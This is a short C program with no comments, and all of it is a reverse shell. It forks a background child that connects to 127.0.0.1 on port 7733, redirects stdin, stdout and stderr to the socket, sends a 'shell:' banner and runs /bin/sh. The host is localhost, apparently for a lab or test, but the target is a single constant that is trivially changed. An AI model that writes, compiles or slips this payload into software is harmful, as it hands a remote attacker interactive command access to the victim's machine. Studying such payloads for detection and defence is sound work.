#include<unistd.h>
#include<stdlib.h>
#include<arpa/inet.h>

#define ADDR "127.0.0.1"
#define PORT 7733

int main()
{
    int pid=fork();
    if(pid==0)
    {
        sleep(0.5);
        struct sockaddr_in sockad;
        sockad.sin_family=AF_INET;
        sockad.sin_port=htons(PORT);
        inet_pton(AF_INET,ADDR,&sockad.sin_addr);
        int sockfd=socket(AF_INET,SOCK_STREAM,0);
        if(sockfd<0)
            exit(0);
        if(connect(sockfd,&sockad,sizeof(sockad))<0)
            exit(0);
        dup2(sockfd,STDIN_FILENO);
        dup2(sockfd,STDOUT_FILENO);
        dup2(sockfd,STDERR_FILENO);
        write(sockfd,"shell:",6);
        execl("/bin/sh",NULL);
    }
    return 0;
}
